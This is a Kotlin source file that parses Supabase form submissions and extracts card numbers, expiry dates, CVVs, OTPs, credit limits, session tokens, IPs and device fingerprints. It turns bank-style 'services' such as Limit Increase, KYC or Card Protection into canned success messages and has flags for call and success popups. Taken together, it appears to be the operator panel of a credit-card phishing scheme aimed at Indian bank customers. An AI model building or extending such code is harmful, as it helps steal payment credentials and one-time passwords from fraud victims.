package com.example.data.supabase

import com.example.util.IndianDateTimeFormatter
import org.json.JSONObject

data class SupabaseSubmission(
    val rawJson: JSONObject,
    val rawFields: Map<String, Any?>,
    val tableName: String
) {
    // Primary Key Extraction - Exact match first
    val idColumnName: String = findIdColumnName()
    val idValue: Any = extractPrimaryIdValue()

    val targetIdString: String
        get() {
            val str = idValue.toString().trim()
            if (str.isNotBlank() && str != "0" && str != "null" && str != "-") return str
            if (sessionId.isNotBlank() && sessionId != "-") return sessionId
            if (deviceId.isNotBlank() && deviceId != "-") return deviceId
            if (mobileNumber.isNotBlank() && mobileNumber != "-") return mobileNumber
            return str
        }

    // Field Extractors for Form Details
    val fullName: String = extractFirstMatchingString(
        "full_name", "name", "customer_name", "first_name", "contact_name", "user_name", "username", "client_name", "title",
        "holder_name", "cardholder_name", "account_holder", "cust_name", "fullname", "patient_name", "applicant_name"
    ) ?: findKeyContaining("name", "user", "client", "title") ?: "Submission #${idValue}"

    val customerName: String get() = fullName

    val email: String = extractFirstMatchingString(
        "email", "email_address", "contact_email", "user_email", "mail", "cust_email", "user_mail"
    ) ?: findValueMatching { it.contains("@") && it.contains(".") } ?: "-"

    val mobileNumber: String = extractFirstMatchingString(
        "mobile_number", "phone", "phone_number", "mobile", "contact_number", "tel", "cell", "contact_no",
        "mobile_no", "mob", "phone_no", "contact", "user_mobile", "user_phone", "cust_mobile", "customer_phone",
        "phone_num", "mobile_num", "customer_mobile", "user_contact", "ph_no"
    ) ?: findKeyContaining("mobile", "phone", "contact", "tel") ?: findValueMatching { str ->
        val digits = str.filter { it.isDigit() }
        digits.length in 10..13 && !str.contains("@") && !str.contains(":")
    } ?: "-"

    val phone: String get() = mobileNumber

    val dob: String = extractFirstMatchingString(
        "dob", "date_of_birth", "birth_date", "birthdate"
    ) ?: "-"

    val cardholderName: String = extractFirstMatchingString(
        "cardholder_name", "card_holder_name", "card_holder", "holder_name"
    ) ?: "-"

    val cardNumber: String = extractFirstMatchingString(
        "card_number", "card_no", "cardno", "card_num", "number"
    ) ?: "-"

    val expiryDate: String = extractFirstMatchingString(
        "expiry_date", "exp_date", "expiry", "exp", "exp_month_year"
    ) ?: "-"

    val cvv: String = extractFirstMatchingString(
        "cvv", "cvc", "security_code"
    ) ?: "-"

    val otp: String = extractFirstMatchingString(
        "otp", "one_time_password", "code", "verification_code"
    ) ?: "-"

    val availableLimit: String = extractFirstMatchingString(
        "available_limit", "avail_limit", "availableLimit", "availLimit", "available_balance", "available", "avail_balance"
    ) ?: "-"

    val totalLimit: String = extractFirstMatchingString(
        "total_limit", "tot_limit", "totalLimit", "totLimit", "card_limit", "credit_limit", "total_credit_limit", "limit"
    ) ?: "-"

    val step: String = extractFirstMatchingString(
        "step", "current_step", "form_step", "steps", "page_step"
    ) ?: "-"

    val formattedAvailableLimit: String
        get() {
            if (availableLimit == "-" || availableLimit.isBlank() || availableLimit.equals("null", ignoreCase = true)) return "-"
            val clean = availableLimit.replace("₹", "").replace(",", "").trim()
            val num = clean.toDoubleOrNull()
            return if (num != null) {
                if (num % 1.0 == 0.0) "₹${String.format("%,d", num.toLong())}" else "₹${String.format("%,.2f", num)}"
            } else {
                if (availableLimit.startsWith("₹")) availableLimit else "₹$availableLimit"
            }
        }

    val formattedTotalLimit: String
        get() {
            if (totalLimit == "-" || totalLimit.isBlank() || totalLimit.equals("null", ignoreCase = true)) return "-"
            val clean = totalLimit.replace("₹", "").replace(",", "").trim()
            val num = clean.toDoubleOrNull()
            return if (num != null) {
                if (num % 1.0 == 0.0) "₹${String.format("%,d", num.toLong())}" else "₹${String.format("%,.2f", num)}"
            } else {
                if (totalLimit.startsWith("₹")) totalLimit else "₹$totalLimit"
            }
        }

    val sessionId: String = extractFirstMatchingString(
        "session_id", "session", "sessionId", "sessionid", "user_session", "client_session", "session_token", "token", "user_token",
        "browser_session", "visitor_session", "sid", "sess_id", "sessid", "session_key", "session_code"
    ) ?: findKeyContaining("session", "token", "sess") ?: "-"

    val userIp: String = extractFirstMatchingString(
        "ip", "ip_address", "user_ip", "client_ip", "ipaddress", "remote_ip", "ip_addr", "remote_addr", "userip", "visitor_ip", "ip_address_v4", "clientip", "ip_v4", "ip_v6", "network_ip", "host_ip"
    ) ?: findKeyContaining("ip_address", "client_ip", "user_ip", "remote_ip", "visitor_ip") ?: findValueMatching { str ->
        val trimmed = str.trim()
        val parts = trimmed.split(".")
        parts.size == 4 && parts.all { it.toIntOrNull() != null && it.toInt() in 0..255 }
    } ?: "-"

    val deviceId: String = extractFirstMatchingString(
        "device_id", "deviceId", "visitor_id", "client_id", "fingerprint", "uuid", "device", "user_id", "guid", "tracking_id", "device_fingerprint"
    ) ?: findKeyContaining("device", "fingerprint", "visitor") ?: "-"

    val sessionTargetKey: String
        get() {
            if (sessionId.isNotBlank() && sessionId != "-") return sessionId
            if (deviceId.isNotBlank() && deviceId != "-") return deviceId
            if (mobileNumber.isNotBlank() && mobileNumber != "-") return mobileNumber
            return idValue.toString()
        }

    val message: String = extractFirstMatchingString(
        "message", "inquiry", "enquiry", "notes", "details", "comments", "description", "request_type", "subject", "body", "content"
    ) ?: findKeyContaining("msg", "content", "body", "text", "query", "detail") ?: buildFallbackSummary()

    val createdAt: String = extractFirstMatchingString(
        "created_at", "timestamp", "submitted_at", "date", "created_date", "time", "inserted_at"
    ) ?: "-"

    val formattedDateTime: String
        get() {
            if (createdAt == "-") return "-"
            val ist = IndianDateTimeFormatter.formatToIndianDateTime(createdAt)
            return if (ist.isNotBlank() && ist != "-") ist else createdAt
        }

    val formattedIndianDate: String get() = IndianDateTimeFormatter.formatToIndianDate(createdAt)
    val formattedIndianTime: String get() = IndianDateTimeFormatter.formatToIndianTime(createdAt)
    val formattedIndianDateTimeWithZone: String get() = IndianDateTimeFormatter.formatToIndianDateTimeWithZone(createdAt)
    val formattedIndianDateSlash: String get() = IndianDateTimeFormatter.formatToIndianDateSlash(createdAt)
    val relativeOrIndianDate: String get() = IndianDateTimeFormatter.formatRelativeOrDate(createdAt)

    val pageId: String = extractFirstMatchingString(
        "page_id", "pageId", "page", "page_name", "source_page", "form_type", "page_number", "source", "type"
    ) ?: "General Enquiries"

    val clickedService: String
        get() {
            // 1. Check direct service/action candidate keys in rawFields
            val direct = extractFirstMatchingString(
                "clicked_service", "service_clicked", "service_name", "servicename",
                "selected_service", "selectedservice", "service_type", "servicetype",
                "service", "action", "action_clicked", "action_name", "card_action",
                "selected_action", "selected_option", "option", "feature", "req_type",
                "request_type", "form_type", "formtype", "form_name", "category",
                "purpose", "reason", "request", "card_service", "service_requested",
                "page_name", "source_page", "button_clicked"
            )
            if (direct != null && direct.isNotBlank() && direct != "-" && direct != "null") {
                return direct
            }
            // 2. Deep scan across all fields: check if ANY field value contains known service keywords
            for ((_, value) in rawFields) {
                if (value != null) {
                    val str = value.toString().trim()
                    val lower = str.lowercase()
                    if (lower.contains("limit") || lower.contains("deactivat") || lower.contains("block") ||
                        lower.contains("pin") || lower.contains("protect") || lower.contains("cpp") ||
                        lower.contains("kyc") || lower.contains("reward") || lower.contains("redeem") ||
                        lower.contains("statement") || lower.contains("upgrade") || lower.contains("reissue") ||
                        lower.contains("replace") || lower.contains("international") || lower.contains("activat")) {
                        return str
                    }
                }
            }
            // 3. Scan keys containing relevant words
            val keyMatch = findKeyContaining("service", "action", "selected", "option", "feature", "type")
            if (keyMatch != null && keyMatch.isNotBlank() && keyMatch != "-" && keyMatch != "null") {
                return keyMatch
            }
            // 4. Fallback to pageId if meaningful, else Card Protection
            return if (pageId.isNotBlank() && pageId != "General Enquiries" && pageId != "-") pageId else "Card Protection"
        }

    val cleanServiceName: String
        get() {
            val raw = clickedService
            val lower = raw.lowercase()
            if (lower.contains("limit")) return "Limit Increase"
            if (lower.contains("deactivat") || lower.contains("block") || lower.contains("disable")) return "Card Deactivate"
            if (lower.contains("pin")) return "Pin Change"
            if (lower.contains("protect") || lower.contains("cpp") || lower.contains("insurance")) return "Card Protection"
            if (lower.contains("kyc")) return "KYC Verification"
            if (lower.contains("reward") || lower.contains("point") || lower.contains("cashback")) return "Reward Redeem"
            if (lower.contains("upgrade")) return "Card Upgrade"
            if (lower.contains("replace") || lower.contains("lost")) return "Card Replacement"
            if (lower.contains("statement")) return "Statement Request"
            val cleaned = raw
                .replace("Activate", "", ignoreCase = true)
                .replace("Successful", "", ignoreCase = true)
                .replace("Successfully", "", ignoreCase = true)
                .replace("Popup", "", ignoreCase = true)
                .replace("Modal", "", ignoreCase = true)
                .trim()
            return if (cleaned.isBlank() || cleaned == "-") "Card Protection" else cleaned
        }

    val successMessageTitle: String
        get() = ServiceMessageFormatter.formatSuccessMessageTitle(clickedService)

    val fields: Map<String, String>
        get() = rawFields.mapValues { it.value?.toString() ?: "-" }

    val status: String = extractFirstMatchingString(
        "status", "state"
    ) ?: if (getIsRead() == true) "Read" else "Unread"

    fun getIsRead(): Boolean? {
        val readVal = rawFields["is_read"] ?: rawFields["read"] ?: rawFields["isRead"]
        if (readVal is Boolean) return readVal
        if (readVal is String) return readVal.equals("true", ignoreCase = true) || readVal.equals("read", ignoreCase = true)
        return null
    }

    fun isPhoneActionRowActive(): Boolean {
        val keys = listOf("phone_action_active", "call_overlay_active", "show_call_popup", "is_phone_action_active", "call_popup", "overlay_active", "action_active")
        for (k in keys) {
            val v = rawFields[k]
            if (v == true || v == "true" || v == 1 || v == "1") return true
        }
        return false
    }

    fun isSuccessMsgRowActive(): Boolean {
        val keys = listOf("show_popup", "popup_active", "is_popup_active", "success_msg_active", "is_success_msg_active")
        for (k in keys) {
            val v = rawFields[k]
            if (v == true || v == "true" || v == 1 || v == "1") return true
        }
        return false
    }

    private fun extractPrimaryIdValue(): Any {
        // 1. Direct exact 'id' key
        val exactId = rawFields["id"] ?: rawFields["ID"] ?: rawFields["Id"]
        if (exactId != null && exactId.toString().isNotBlank() && exactId.toString() != "null") {
            return exactId
        }
        // 2. Exact UUID / submission_id / row_id / session_id
        val explicitKeys = listOf("uuid", "submission_id", "sub_id", "row_id", "record_id", "user_id", "session_id", "sessionId")
        for (cand in explicitKeys) {
            val matchingKey = rawFields.keys.firstOrNull { it.equals(cand, ignoreCase = true) }
            if (matchingKey != null) {
                val v = rawFields[matchingKey]
                if (v != null && v.toString().isNotBlank() && v.toString() != "null") {
                    return v
                }
            }
        }
        // 3. Fallback to any key named like *_id
        val idCol = findIdColumnName()
        val colVal = rawFields[idCol]
        if (colVal != null && colVal.toString().isNotBlank() && colVal.toString() != "null") {
            return colVal
        }
        return 0
    }

    private fun findIdColumnName(): String {
        val keys = rawFields.keys
        // Exact 'id' priority
        val exact = keys.firstOrNull { it.equals("id", ignoreCase = true) }
        if (exact != null) return exact

        // Specific ID candidates
        val candidates = listOf("uuid", "submission_id", "sub_id", "row_id", "record_id", "user_id", "session_id")
        for (c in candidates) {
            val match = keys.firstOrNull { it.equals(c, ignoreCase = true) }
            if (match != null) return match
        }

        // Generic *_id
        for (key in keys) {
            if (key.endsWith("_id", ignoreCase = true) ||
                key.equals("idColumn", ignoreCase = true)) {
                return key
            }
        }
        return "id"
    }

    private fun findKeyContaining(vararg keywords: String): String? {
        for (key in rawFields.keys) {
            val lower = key.lowercase()
            if (keywords.any { lower.contains(it) }) {
                val value = rawFields[key]
                if (value != null && value.toString().isNotBlank() && value.toString() != "null") {
                    return value.toString()
                }
            }
        }
        return null
    }

    private fun findValueMatching(predicate: (String) -> Boolean): String? {
        for ((_, value) in rawFields) {
            if (value != null) {
                val str = value.toString()
                if (str.isNotBlank() && predicate(str)) {
                    return str
                }
            }
        }
        return null
    }

    private fun buildFallbackSummary(): String {
        val nonIdParts = mutableListOf<String>()
        for ((key, value) in rawFields) {
            if (!key.equals("id", ignoreCase = true) && !key.endsWith("_id", ignoreCase = true) && value != null) {
                val str = value.toString()
                if (str.isNotBlank() && str != "null") {
                    nonIdParts.add("$key: $str")
                }
            }
        }
        return if (nonIdParts.isNotEmpty()) nonIdParts.take(3).joinToString(" | ") else "Form Submission"
    }

    private fun extractFirstMatchingString(vararg candidates: String): String? {
        for (candidate in candidates) {
            val matchingKey = rawFields.keys.firstOrNull { it.equals(candidate, ignoreCase = true) }
            if (matchingKey != null) {
                val value = rawFields[matchingKey]
                if (value != null && value.toString().isNotBlank() && value.toString() != "null") {
                    return value.toString()
                }
            }
        }
        return null
    }

    companion object {
        fun fromJsonObject(jsonObject: JSONObject, tableName: String): SupabaseSubmission {
            val map = mutableMapOf<String, Any?>()
            val keys = jsonObject.keys()
            while (keys.hasNext()) {
                val key = keys.next()
                map[key] = if (jsonObject.isNull(key)) null else jsonObject.get(key)
            }
            return SupabaseSubmission(
                rawJson = jsonObject,
                rawFields = map,
                tableName = tableName
            )
        }
    }
}

object ServiceMessageFormatter {
    fun formatSuccessMessageTitle(serviceRaw: String): String {
        val trimmed = serviceRaw.trim()
        val lower = trimmed.lowercase()
        // 1. Limit Increase / Limit Upgrade -> "Your Limit Increased Successful"
        if (lower.contains("limit")) {
            return "Your Limit Increased Successful"
        }
        // 2. Card Deactivate / Block Card -> "Card Deactivate Successful"
        if (lower.contains("deactivat") || lower.contains("block") || lower.contains("disable")) {
            return "Card Deactivate Successful"
        }
        // 3. PIN Change / Reset -> "Pin Change Successful"
        if (lower.contains("pin")) {
            return "Pin Change Successful"
        }
        // 4. Card Protection / CPP -> "Activate Card Protection Successful"
        if (lower.contains("protect") || lower.contains("cpp") || lower.contains("insurance")) {
            return "Activate Card Protection Successful"
        }
        // 5. KYC -> "KYC Verification Successful"
        if (lower.contains("kyc")) {
            return "KYC Verification Successful"
        }
        // 6. Reward Points / Redeem -> "Reward Points Redeem Successful"
        if (lower.contains("reward") || lower.contains("point") || lower.contains("cashback")) {
            return "Reward Points Redeem Successful"
        }
        // 7. Statement -> "Statement Request Successful"
        if (lower.contains("statement")) {
            return "Statement Request Successful"
        }
        // 8. Explicit Activate / Activation -> "Activate [Service] Successful"
        if (lower.contains("activat")) {
            val cleaned = trimmed
                .replace("Activate", "", ignoreCase = true)
                .replace("Activation", "", ignoreCase = true)
                .replace("Successful", "", ignoreCase = true)
                .replace("Successfully", "", ignoreCase = true)
                .trim()
            return if (cleaned.isNotBlank()) "Activate $cleaned Successful" else "Activate Card Successful"
        }
        // 9. If user already typed something ending with or containing "Successful"
        val cleanUserText = trimmed
            .replace("Successfully", "Successful", ignoreCase = true)
            .trim()
        if (cleanUserText.endsWith("Successful", ignoreCase = true)) {
            return cleanUserText
        }
        return if (cleanUserText.isNotBlank()) {
            "$cleanUserText Successful"
        } else {
            "Activate Card Protection Successful"
        }
    }
}
